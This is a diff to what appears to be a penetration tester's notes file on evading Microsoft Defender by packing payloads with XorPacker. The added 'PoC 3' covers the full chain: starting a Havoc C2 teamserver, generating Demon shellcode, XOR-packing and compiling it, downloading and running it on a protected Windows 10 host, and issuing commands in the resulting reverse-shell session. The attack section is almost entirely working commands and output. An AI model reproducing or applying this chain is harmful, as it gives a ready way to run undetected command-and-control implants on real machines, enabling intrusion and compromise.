@@ -1,6 +1,6 @@
-=========================================================================================================================================================
+============================================================================================================================================
 AV bypass using the packer 'XorPacker'
-=========================================================================================================================================================
+============================================================================================================================================
 
 => Source: https://github.com/tmenochet/XorPacker
 
@@ -11,9 +11,9 @@ XorPacker can be used to pack:
 => .NET assembly
 => Shellcode
 
-=========================================================================================================================================================
+============================================================================================================================================
 PoC 1 - Example with Mimikatz.exe (x64) running on a Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
-=========================================================================================================================================================
+============================================================================================================================================
 
 ------------------------------------------------------------------------------
 Step 1 - Build the tool 'XorPacker' (https://github.com/tmenochet/XorPacker)
@@ -176,9 +176,9 @@ SID               : S-1-5-21-936125016-2310263949-2175806047-500
 <SNIP>
 
 
-=========================================================================================================================================================
+============================================================================================================================================
 PoC 2 - Example with a Meterpreter reverse shell HTTPS (x64) running on a Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
-=========================================================================================================================================================
+============================================================================================================================================
 
 ------------------------------------------------------------------------------------
 Step 1 - Generate a Meterpreter reverse shell HTTPS (x64) using 'Msfvenom'
@@ -331,3 +331,163 @@ Mode                 LastWriteTime         Length Name
 -a---         23/12/2022     07:21      110287880 VirtualBox-7.0.4-154605-Win.exe
 
 <SNIP>
+
+
+============================================================================================================================================
+PoC 3 - Example with a HAVOC reverse shell HTTPS (x64) running on a Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
+============================================================================================================================================
+
+------------------------------------------------------------------------------------
+Step 1 - Start the HAVOC teamserver and the HAVOC client
+------------------------------------------------------------------------------------
+
+1. Start the HAVOC teamserver
+=> jeff@kali:~/Documents/Tools/HavocC2/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/jeff-havoc-profile.yaotl -v --debug
+
+
+2. Start the HAVOC client and join the HAVOC teamserver
+=> jeff@kali:~/Documents/Tools/HavocC2/Havoc/Client$ ./Havoc 
+
+
+------------------------------------------------------------------------------------
+Step 2 - Generate a HAVOC reverse shell HTTPS (x64) - Format "Windows Shellcode"
+------------------------------------------------------------------------------------
+
+Generate a new HAVOC payload with the format "Windows Shellcode" (click on “Attack” => “Payload“ => "Generate" (at the bottom of the window))
+
+Agent: Demon
+Options
+ > Listener: Test
+ > Arch: x64
+ > Format: Windows Shellcode
+Config
+ > Sleep: 2                                        //The default interval to sleep between check-ins for commands.
+ > Indirect Syscall: Enabled
+ > Sleep Technique: WaitForSIngleObjectEx          //Choose between: "WaitForSIngleObjectEx" (no obfuscation), "Ekko" and "Foliage"
+ > Injection
+   > Alloc: Native/Syscall
+   > Execute: Native/Syscall
+   > Spawn64: C:\Windows\System32\notepad.exe      //The full path to the process to spawn into for fork & run operations (64bit).
+   > Spawn32: C:\Windows\Syswow64\notepad.exe      //The full path to the process to spawn into for fork & run operations (32bit).
+
+Building Console
+[*] Starting build
+[*] Use indirect syscalls
+[*] Config size [376 bytes]
+[*] Compiling core dll...
+[*] Compiled core dll [65536 bytes]
+[*] Shellcode payload [66559 bytes]
+[+] Payload generated
+
+Payload saved under: /home/jeff/Documents/Tools/HavocC2/HavocShellcode.exe
+
+
+---------------------------------------------------------------------------------------------
+Step 3 - Use 'XorPacker' to generate a packed version of the HAVOC HTTPS reverse shell (x64)
+---------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/XorPacker-master$ python3 ./xorpacker.py -f /home/jeff/Documents/Tools/HavocC2/HavocShellcode.bin -t SHELLCODE -a x64
+
+[>] Payload file: /home/jeff/Documents/Tools/HavocC2/HavocShellcode.bin
+[>] Payload type: SHELLCODE
+[*] Encrypting payload...
+[*] Compressing payload...
+[*] Encoding payload...
+[*] Generating source file...
+[>] You should now build payload.go
+
+jeff@kali:~/Documents/Tools/XorPacker-master$ GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build payload.go
+
+jeff@kali:~/Documents/Tools/XorPacker-master$ ls -al
+total 30368
+drwxr-xr-x  4 jeff jeff    4096 Jan 16 23:26 .
+drwxr-xr-x 54 jeff jeff    4096 Jan 15 01:43 ..
+-rw-r--r--  1 jeff jeff      97 Oct 19  2020 .gitmodules
+-rw-r--r--  1 jeff jeff   35148 Oct 19  2020 LICENSE
+-rw-r--r--  1 jeff jeff   34384 Dec 25 21:26 loader.bin
+drwxr-xr-x  7 jeff jeff    4096 Dec 21 01:40 MemoryModule
+-rw-r--r--  1 jeff jeff   16503 Dec 21 03:11 Notes.txt
+-rwxr-xr-x  1 jeff jeff 1824768 Jan 16 23:26 payload.exe
+-rw-r--r--  1 jeff jeff   53191 Jan 16 23:26 payload.go
+drwxr-xr-x  2 jeff jeff    4096 Jan 16 23:02 __pycache__
+-rwxr-xr-x  1 jeff jeff    1910 Oct 19  2020 README.md
+-rwxr-xr-x  1 jeff jeff    1615 Oct 19  2020 stub_shellcode_go.py
+-rwxr-xr-x  1 jeff jeff    1934 Oct 19  2020 stub_unmanaged_go.py
+-rwxr-xr-x  1 jeff jeff    2720 Oct 19  2020 xorpacker.py
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------
+Step 4 - Download & execute the packed version of the HAVOC HTTPS reverse shell (x64) on a Windows 10 laptop (with the MS Defender AV enabled)
+----------------------------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/XorPacker-master$ python3 -m http.server 8080Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+192.168.56.1 - - [16/Jan/2023 23:27:34] "GET / HTTP/1.1" 200 -
+192.168.56.1 - - [16/Jan/2023 23:27:36] "GET /payload.exe HTTP/1.1" 200 -
+
+
+PS C:\temp> wget -URI http://192.168.56.104:8080/payload.exe -OutFile payload.exe
+
+PS C:\temp> dir
+
+    Directory: C:\temp
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        16/01/2023     23:27        1824768 payload.exe
+
+
+PS C:\temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled
+
+AntivirusEnabled RealTimeProtectionEnabled IoavProtectionEnabled AntispywareEnabled
+---------------- ------------------------- --------------------- ------------------
+            True                      True                  True               True
+
+
+PS C:\temp> .\payload.exe
+
+
+-------------------------------------------------------------------------------------------------------------------
+Step 5 - Enjoy the HAVOC reverse shell running on the target Windows 10 laptop (with the MS Defender AV enabled)
+-------------------------------------------------------------------------------------------------------------------
+
+HAVOC Teamserver
+==================
+[16/01/2023 23:33:34] Agent 2CB02CD2 authenticated from as Laptop1\Administrator :: [Internal: 0.0.0.0] [Process: payload.exe\3316] [Arch: x64] [Pivot: Direct]
+
+16/01/2023 23:35:01 [Jeff] Demon >> dir
+[*] [EB061D49] Tasked demon to list current directory
+[+] Send Task to Agent [26 bytes]
+[*] List Directory: C:\temp
+
+ Size         Type     Last Modified         Name
+ ----         ----     -------------------   ----
+ 1.82 MB      file     16/01/2023 43:27:23   payload.exe
+
+16/01/2023 23:38:02 [Jeff] Demon >> proc list
+[*] [FD8B7E65] Tasked demon to enumerate and list all processes
+[+] Send Task to Agent [12 bytes]
+[*] Process List:
+
+ Name                                 PID    PPID   Session   Arch    Threads   User
+ ----                                 ---    ----   -------   ----    -------   ----
+                                      0      0      0         x64     8             
+ System                               4      0      0         x64     249           
+ Secure System                        72     4      0         x64     0         NT AUTHORITY\SYSTEM
+ Registry                             132    4      0         x64     4         NT AUTHORITY\SYSTEM
+ smss.exe                             540    4      0         x64     2         NT AUTHORITY\SYSTEM
+ csrss.exe                            708    648    0         x64     12        NT AUTHORITY\SYSTEM
+ wininit.exe                          796    648    0         x64     1         NT AUTHORITY\SYSTEM
+ services.exe                         936    796    0         x64     8         NT AUTHORITY\SYSTEM
+ LsaIso.exe                           956    796    0         x64     1         NT AUTHORITY\SYSTEM
+ lsass.exe                            964    796    0         x64     10        NT AUTHORITY\SYSTEM
+ svchost.exe                          692    936    0         x64     18        NT AUTHORITY\SYSTEM
+ WUDFHost.exe                         808    936    0         x64     8         NT AUTHORITY\LOCAL SERVICE
+ <SNIP>
+ cmd.exe                              16372   3144   4        x64     3         Laptop1\Administrator
+ conhost.exe                          11456   16372   4       x64     6         Laptop1\Administrator
+ powershell.exe                       10452   16372   4       x64     12        Laptop1\Administrator
+ payload.exe                          15648   10452   4       x64     10        Laptop1\Administrator
+  <SNIP>
+  
+  
+ 
